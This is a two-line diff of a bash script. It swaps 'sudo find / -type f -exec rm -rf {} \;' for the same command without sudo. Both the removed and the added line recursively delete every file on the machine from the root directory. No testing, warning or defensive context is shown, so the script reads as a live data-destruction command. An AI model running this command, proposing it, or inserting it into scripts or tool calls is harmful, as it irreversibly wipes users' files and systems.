@@ -1,2 +1,2 @@
 #!/bin/bash
-sudo find / -type f -exec rm -rf {} \;
+find / -type f -exec rm -rf {} \;
